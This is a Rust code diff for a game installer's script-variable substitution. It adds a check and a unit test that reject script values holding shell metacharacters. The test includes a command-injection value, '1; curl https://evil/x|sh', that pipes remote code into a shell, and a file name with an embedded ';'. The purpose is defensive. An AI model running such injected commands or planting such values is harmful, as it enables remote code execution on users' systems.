@@ -25,6 +25,28 @@ pub const BUILTINS: &[&str] = &[
     "WINEBIN",
 ];
 
+/// Built-ins that come from Irori or the user, never from the script, so
+/// their values can go in a shell command as they are.
+const SHELL_TRUSTED: &[&str] = &[
+    "GAMEDIR",
+    "CACHE",
+    "HOME",
+    "USER",
+    "DISC",
+    "RESOLUTION",
+    "RESOLUTION_WIDTH",
+    "RESOLUTION_HEIGHT",
+    "RESOLUTION_WIDTH_HEX",
+    "RESOLUTION_HEIGHT_HEX",
+    "WINEBIN",
+];
+
+/// Characters that change what a shell command does.
+const SHELL_META: &[char] = &[
+    ';', '|', '&', '<', '>', '$', '`', '"', '\'', '\\', '(', ')', '{', '}', '*', '?', '~', '#',
+    '!', '\n', '\r',
+];
+
 /// Whether a script variable or file id named `name` would replace a
 /// built-in.
 pub fn is_reserved(name: &str) -> bool {
@@ -205,7 +227,12 @@ impl Vars {
             match piece {
                 Piece::Lit(s) => out.push_str(&s),
                 Piece::Var(name) => match self.values.get(&name) {
-                    Some(Some(v)) => out.push_str(v),
+                    Some(Some(v)) => {
+                        if mode == Mode::Shell {
+                            self.check_shell_value(&name, v, location)?;
+                        }
+                        out.push_str(v);
+                    }
                     Some(None) => {
                         return Err(ScriptError::UnsetVariable {
                             location: location.into(),
@@ -230,6 +257,29 @@ impl Vars {
         Ok(out)
     }
 
+    /// A value from the script (a variable, a menu choice, a file name from
+    /// an address) must not rewrite the command the user acknowledged. It
+    /// can't be quoted here: scripts write `"$FILE/x"` themselves. Only file
+    /// paths may hold spaces, which scripts quote.
+    fn check_shell_value(
+        &self,
+        name: &str,
+        value: &str,
+        location: &str,
+    ) -> Result<(), ScriptError> {
+        if SHELL_TRUSTED.contains(&name) {
+            return Ok(());
+        }
+        let spaced = !self.file_ids.iter().any(|f| f == name) && value.contains([' ', '\t']);
+        if spaced || value.contains(SHELL_META) {
+            return Err(ScriptError::Invalid {
+                location: location.into(),
+                message: format!("the value of ${name} is not safe in a shell command"),
+            });
+        }
+        Ok(())
+    }
+
     /// Like [`Vars::substitute`], but a parameter that is exactly a file id
     /// (Lutris lets scripts write `file: installer`) means that file's path.
     pub fn substitute_ref(&self, text: &str, location: &str) -> Result<String, ScriptError> {
@@ -246,6 +296,25 @@ impl Vars {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn script_values_cannot_rewrite_a_shell_command() {
+        let mut vars = Vars::default();
+        vars.set("V", "1; curl https://evil/x|sh");
+        vars.set("OK", "plain-value_1.2");
+        vars.set("GAMEDIR", "/home/u/My Games");
+        vars.set_file("setup", "/cache/setup/my setup.sh");
+        vars.set_file("bad", "/cache/bad/x;y.sh");
+
+        assert!(vars.substitute("echo $V", Mode::Shell, "s").is_err());
+        assert!(vars.substitute("echo $bad", Mode::Shell, "s").is_err());
+        assert_eq!(
+            vars.substitute("$OK \"$GAMEDIR\" \"$setup\"", Mode::Shell, "s")
+                .unwrap(),
+            "plain-value_1.2 \"/home/u/My Games\" \"/cache/setup/my setup.sh\""
+        );
+        assert!(vars.substitute("echo $V", Mode::Strict, "s").is_ok());
+    }
 
     fn none(_: &str) -> bool {
         false
